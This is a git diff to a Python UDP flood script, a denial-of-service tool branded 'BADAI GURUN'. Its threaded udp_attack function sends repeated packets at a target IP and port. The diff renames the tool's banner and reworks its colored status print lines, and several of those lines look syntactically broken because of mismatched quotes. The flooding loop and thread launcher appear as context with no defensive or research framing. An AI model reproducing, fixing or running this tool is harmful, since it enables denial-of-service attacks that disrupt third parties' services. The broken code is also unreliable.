@@ -81,11 +81,11 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f"  \e[1;37m:: \e[1;30mBADAI GURUN \e[0;31m= \e[0;37mUDP\e[0;33m~\e[0;33mATTACK \e[0;34m " +ip+ "\e[0;35mrunning\033[0m')
-            print(f"  \e[1;31m:: \e[1;33mBADAI GURUN \e[0;31m= \e[0;33mUDP\e[0;33m~\e[0;37mATTACK \e[0;33m " +ip+ "\e[1;31mrunning\033[0m')
+            print(f'  \e[1;37m:: \e[1;30mBADAI GURUN \e[0;31m= \e[0;37mUDP\e[0;33m~\e[0;33mATTACK \e[0;34m " +ip+ "\e[0;35mrunning\033[0m')
+            print(f'  \e[1;31m:: \e[1;33mBADAI GURUN \e[0;31m= \e[0;33mUDP\e[0;33m~\e[0;37mATTACK \e[0;33m " +ip+ "\e[1;31mrunning\033[0m')
         except socket.error:
             s.close()
-            
+            print(f'  \e[1;33m:: \e[0;36mBADAI GURUN \e[0;34m= \e[0;31mUDP\e[0;33m~\e[0;371ATTACK \e[0;34m " +ip+ "\e[1;37mrunning\033[0m')
             break
 
 # Threaded attack function
@@ -95,7 +95,7 @@ def start_attack(target_ip, target_port, packet, thread_count, method, duration)
             th = threading.Thread(target=udp_attack, args=(target_ip, target_port, packet, duration, thread_count))
             th.start()
     else:
-        print("[BADAI AL-AQSHA] Unsupported method. Only UDP supported in this version.")
+        print('[BADAI GURUN] Unsupported method. Only UDP supported in this version.')
 
 # Main program flow
 def main():
@@ -110,5 +110,5 @@ if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n[BADAI AL-AQSHA] Attack interrupted. Exiting...")
+        print("\n[BADAI GURUN] Attack interrupted. Exiting...")
         sys.exit()
